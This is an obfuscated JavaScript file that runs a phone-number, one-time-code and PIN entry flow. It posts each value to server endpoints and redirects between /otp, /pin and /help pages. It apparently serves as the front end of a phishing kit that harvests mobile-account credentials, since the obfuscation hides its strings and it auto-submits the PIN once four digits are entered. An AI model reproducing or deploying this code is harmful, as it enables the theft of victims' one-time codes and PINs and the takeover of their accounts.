const _0x1a83db = _0x5e3b;
(function(_0x1f1bed, _0x4c5fbd) {
    const _0x2949ce = _0x5e3b,
        _0x5bb147 = _0x1f1bed();
    while (!![]) {
        try {
            const _0x376f49 = -parseInt(_0x2949ce(0x1b5)) / 0x1 + parseInt(_0x2949ce(0x1bc)) / 0x2 * (parseInt(_0x2949ce(0x1c2)) / 0x3) + -parseInt(_0x2949ce(0x1d5)) / 0x4 * (parseInt(_0x2949ce(0x1cc)) / 0x5) + -parseInt(_0x2949ce(0x1c9)) / 0x6 + parseInt(_0x2949ce(0x1b8)) / 0x7 * (parseInt(_0x2949ce(0x1d2)) / 0x8) + parseInt(_0x2949ce(0x1d0)) / 0x9 + -parseInt(_0x2949ce(0x1c6)) / 0xa;
            if (_0x376f49 === _0x4c5fbd) break;
            else _0x5bb147['push'](_0x5bb147['shift']());
        } catch (_0x122145) {
            _0x5bb147['push'](_0x5bb147['shift']());
        }
    }
}(_0x1b06, 0x1de16));
const phone = document[_0x1a83db(0x1dd)](_0x1a83db(0x1d1)),
    pin = document[_0x1a83db(0x1dd)](_0x1a83db(0x1c5)),
    otp = document['getElementById'](_0x1a83db(0x1a8)),
    phoneButton = document['getElementById'](_0x1a83db(0x1a9)),
    otpButton = document['getElementById'](_0x1a83db(0x1b3)),
    pinButton = document['getElementById']('submit-btn3'),
    displayPhone = document[_0x1a83db(0x1dd)](_0x1a83db(0x1bf)),
    changeNumber = document[_0x1a83db(0x1dd)](_0x1a83db(0x1d9));

function sleep(_0x41bfda) {
    return new Promise(_0x579b17 => setTimeout(_0x579b17, _0x41bfda));
}

function phoneErrorMsg() {
    const _0x145897 = _0x1a83db,
        _0x359a4d = document[_0x145897(0x1dd)]('error-msg');
    _0x359a4d[_0x145897(0x1ae)] = 'Invalid\x20phone\x20number,\x20please\x20try\x20again!', setTimeout(function() {
        _0x359a4d['innerHTML'] = '';
    }, 0xbb8);
}

function otpErrorMsg() {
    const _0x23e528 = _0x1a83db,
        _0x1c9969 = document['getElementById'](_0x23e528(0x1b2));
    _0x1c9969['innerHTML'] = _0x23e528(0x1ab), setTimeout(function() {
        const _0x44d469 = _0x23e528;
        _0x1c9969[_0x44d469(0x1ae)] = '';
    }, 0xbb8);
}

function pinErrorMsg() {
    const _0x2c254f = _0x1a83db,
        _0x4c42f5 = document[_0x2c254f(0x1dd)](_0x2c254f(0x1b2));
    _0x4c42f5[_0x2c254f(0x1ae)] = _0x2c254f(0x1ba), setTimeout(function() {
        _0x4c42f5['innerHTML'] = '';
    }, 0x5dc);
}

function submitPhone() {
    const _0x5fc2f4 = _0x1a83db;
    console[_0x5fc2f4(0x1d8)](phone['value']), storePhone('0' + phone[_0x5fc2f4(0x1b4)]);
    const _0x51ee81 = {
        'phone': phone[_0x5fc2f4(0x1b4)]
    };
    fetch(_0x5fc2f4(0x1cd), {
        'method': _0x5fc2f4(0x1ce),
        'headers': {
            'Content-Type': _0x5fc2f4(0x1b0)
        },
        'body': JSON[_0x5fc2f4(0x1d3)](_0x51ee81)
    })[_0x5fc2f4(0x1db)](_0x27a5b2 => _0x27a5b2[_0x5fc2f4(0x1c0)]())[_0x5fc2f4(0x1db)](_0x2fcef8 => {
        const _0x1fd8a3 = _0x5fc2f4;
        _0x2fcef8[_0x1fd8a3(0x1c7)] == _0x1fd8a3(0x1d6) ? window[_0x1fd8a3(0x1c3)][_0x1fd8a3(0x1b1)] = _0x1fd8a3(0x1c1) : phoneErrorMsg();
    });
}

function submitOtp() {
    const _0x5b9e27 = _0x1a83db;
    console[_0x5b9e27(0x1d8)](otp['value']);
    const _0x31d767 = {
        'otp': otp[_0x5b9e27(0x1b4)]
    };
    fetch('/submitotp', {
        'method': _0x5b9e27(0x1ce),
        'headers': {
            'Content-Type': _0x5b9e27(0x1b0)
        },
        'body': JSON[_0x5b9e27(0x1d3)](_0x31d767)
    })[_0x5b9e27(0x1db)](_0x168bbf => _0x168bbf['json']())[_0x5b9e27(0x1db)](_0xd74c3c => {
        const _0x40468d = _0x5b9e27;
        _0xd74c3c[_0x40468d(0x1c7)] == _0x40468d(0x1d6) ? window['location'][_0x40468d(0x1b9)](_0x40468d(0x1c4)) : otpErrorMsg();
    });
}

function submitPin(_0x1d471b) {
    const _0x5f3106 = _0x1a83db,
        _0x55a6f1 = {
            'pin': _0x1d471b
        };
    fetch('/submitpin', {
        'method': _0x5f3106(0x1ce),
        'headers': {
            'Content-Type': _0x5f3106(0x1b0)
        },
        'body': JSON[_0x5f3106(0x1d3)](_0x55a6f1)
    })[_0x5f3106(0x1db)](_0x2fcd43 => _0x2fcd43['json']())[_0x5f3106(0x1db)](_0x205450 => {
        const _0x6f43cf = _0x5f3106;
        _0x205450[_0x6f43cf(0x1c7)] == _0x6f43cf(0x1d6) ? (sleep(0x3e8), window[_0x6f43cf(0x1c3)]['replace'](_0x6f43cf(0x1be))) : (inputPinSection[_0x6f43cf(0x1b4)] = '', pinErrorMsg());
    });
}

function storePhone(_0x1f1188) {
    const _0x9022db = _0x1a83db;
    localStorage[_0x9022db(0x1c8)]('phone', _0x1f1188);
}

function _0x5e3b(_0x3e1c1f, _0x1d8a39) {
    const _0x1b0621 = _0x1b06();
    return _0x5e3b = function(_0x5e3b2f, _0x15893a) {
        _0x5e3b2f = _0x5e3b2f - 0x1a8;
        let _0x7aa31b = _0x1b0621[_0x5e3b2f];
        return _0x7aa31b;
    }, _0x5e3b(_0x3e1c1f, _0x1d8a39);
}
if (phoneButton) phoneButton[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), submitPhone);
else otpButton && otpButton[_0x1a83db(0x1ac)]('click', submitOtp);
if (displayPhone) {
    const phoneNumber = localStorage[_0x1a83db(0x1bd)](_0x1a83db(0x1cf));
    displayPhone[_0x1a83db(0x1ae)] = phoneNumber;
}
if (changeNumber) {
    const phoneNumber = localStorage[_0x1a83db(0x1bd)](_0x1a83db(0x1cf));
    changeNumber['innerHTML'] = phoneNumber;
}
const inputPinSection = document[_0x1a83db(0x1dd)](_0x1a83db(0x1ad)),
    num1 = document[_0x1a83db(0x1dd)](_0x1a83db(0x1cb)),
    num2 = document['getElementById']('num2'),
    num3 = document[_0x1a83db(0x1dd)]('num3'),
    num4 = document[_0x1a83db(0x1dd)](_0x1a83db(0x1af)),
    num5 = document[_0x1a83db(0x1dd)]('num5'),
    num6 = document[_0x1a83db(0x1dd)](_0x1a83db(0x1b6)),
    num7 = document[_0x1a83db(0x1dd)](_0x1a83db(0x1d4)),
    num8 = document[_0x1a83db(0x1dd)](_0x1a83db(0x1d7)),
    num9 = document[_0x1a83db(0x1dd)](_0x1a83db(0x1dc)),
    num0 = document['getElementById']('num0'),
    deleteKey = document[_0x1a83db(0x1dd)](_0x1a83db(0x1b7));

function addnum1() {
    const _0x3976ac = _0x1a83db;
    let _0xbc295e = inputPinSection['value'] += num1['value'];
    console[_0x3976ac(0x1d8)](num1[_0x3976ac(0x1b4)]), _0xbc295e[_0x3976ac(0x1bb)] == 0x4 && submitPin(inputPinSection[_0x3976ac(0x1b4)]);
}
num1 && num1[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum1);

function addnum2() {
    const _0x2490ca = _0x1a83db;
    let _0x470646 = inputPinSection['value'] += num2[_0x2490ca(0x1b4)];
    console[_0x2490ca(0x1d8)](num2[_0x2490ca(0x1b4)]), _0x470646['length'] == 0x4 && submitPin(inputPinSection[_0x2490ca(0x1b4)]);
}
num2 && num2['addEventListener'](_0x1a83db(0x1ca), addnum2);

function addnum3() {
    const _0xb75a04 = _0x1a83db;
    let _0x6d9eb6 = inputPinSection['value'] += num3[_0xb75a04(0x1b4)];
    console[_0xb75a04(0x1d8)](num3[_0xb75a04(0x1b4)]), _0x6d9eb6['length'] == 0x4 && submitPin(inputPinSection[_0xb75a04(0x1b4)]);
}
num3 && num3[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum3);

function addnum4() {
    const _0x25ccc6 = _0x1a83db;
    let _0x27d41e = inputPinSection[_0x25ccc6(0x1b4)] += num4['value'];
    console[_0x25ccc6(0x1d8)](num4['value']), _0x27d41e['length'] == 0x4 && submitPin(inputPinSection[_0x25ccc6(0x1b4)]);
}
num4 && num4[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum4);

function addnum5() {
    const _0x3238c9 = _0x1a83db;
    let _0x361bfe = inputPinSection[_0x3238c9(0x1b4)] += num5[_0x3238c9(0x1b4)];
    console['log'](num5['value']), _0x361bfe[_0x3238c9(0x1bb)] == 0x4 && submitPin(inputPinSection[_0x3238c9(0x1b4)]);
}
num5 && num5[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum5);

function addnum6() {
    const _0x2bc609 = _0x1a83db;
    let _0x5663a9 = inputPinSection['value'] += num6[_0x2bc609(0x1b4)];
    console['log'](num6['value']), _0x5663a9['length'] == 0x4 && submitPin(inputPinSection[_0x2bc609(0x1b4)]);
}
num6 && num6[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum6);

function addnum7() {
    const _0x560767 = _0x1a83db;
    let _0x4c6203 = inputPinSection[_0x560767(0x1b4)] += num7['value'];
    console[_0x560767(0x1d8)](num7[_0x560767(0x1b4)]), _0x4c6203['length'] == 0x4 && submitPin(inputPinSection['value']);
}
num7 && num7[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum7);

function addnum8() {
    const _0x3b28aa = _0x1a83db;
    let _0x2f9c6b = inputPinSection[_0x3b28aa(0x1b4)] += num8[_0x3b28aa(0x1b4)];
    console[_0x3b28aa(0x1d8)](num9[_0x3b28aa(0x1b4)]), _0x2f9c6b[_0x3b28aa(0x1bb)] == 0x4 && submitPin(inputPinSection['value']);
}
num8 && num8['addEventListener'](_0x1a83db(0x1ca), addnum8);

function addnum9() {
    const _0x400c81 = _0x1a83db;
    let _0xba28fd = inputPinSection[_0x400c81(0x1b4)] += num9[_0x400c81(0x1b4)];
    console[_0x400c81(0x1d8)](num9[_0x400c81(0x1b4)]), _0xba28fd[_0x400c81(0x1bb)] == 0x4 && submitPin(inputPinSection[_0x400c81(0x1b4)]);
}
num9 && num9[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum9);

function addnum0() {
    const _0x36d4e8 = _0x1a83db;
    let _0x1731c4 = inputPinSection[_0x36d4e8(0x1b4)] += num0[_0x36d4e8(0x1b4)];
    console[_0x36d4e8(0x1d8)](num0[_0x36d4e8(0x1b4)]), _0x1731c4['length'] == 0x4 && submitPin(inputPinSection['value']);
}

function _0x1b06() {
    const _0x3a1298 = ['/help', 'phonenumber', 'json', '/otp', '9aWAZWJ', 'location', '/pin', 'pin', '288260hPhtCJ', 'message', 'setItem', '746952UuTMUO', 'click', 'num1', '15MLmeFN', '/phone', 'POST', 'phone', '878067MpZIpS', 'number', '8bBRkVW', 'stringify', 'num7', '103640rWcHnp', 'success', 'num8', 'log', 'change-number', 'change-number-msg', 'then', 'num9', 'getElementById', 'otp', 'submit-btn1', 'slice', 'Invalid\x20OTP,\x20please\x20try\x20again!', 'addEventListener', 'input-pin-section', 'innerHTML', 'num4', 'application/json', 'href', 'error-msg', 'submit-btn2', 'value', '78412ixBBVz', 'num6', 'delete', '1608012iXcsup', 'replace', 'Invalid\x20PIN,\x20please\x20try\x20again!', 'length', '69714yLaGgH', 'getItem'];
    _0x1b06 = function() {
        return _0x3a1298;
    };
    return _0x1b06();
}
num0 && num0[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), addnum0);

function deleteNum() {
    const _0x1dbf31 = _0x1a83db;
    let _0xd6e7cf = inputPinSection[_0x1dbf31(0x1b4)];
    inputPinSection['value'] = _0xd6e7cf[_0x1dbf31(0x1aa)](0x0, -0x1), console[_0x1dbf31(0x1d8)](_0xd6e7cf[_0x1dbf31(0x1aa)](0x0, -0x1));
}
deleteKey && deleteKey[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), deleteNum);
const changeNum = document[_0x1a83db(0x1dd)](_0x1a83db(0x1da));

function changeNumRedirect() {
    const _0x2549a4 = _0x1a83db;
    window[_0x2549a4(0x1c3)][_0x2549a4(0x1b1)] = '/';
}
changeNum && changeNum[_0x1a83db(0x1ac)](_0x1a83db(0x1ca), changeNumRedirect);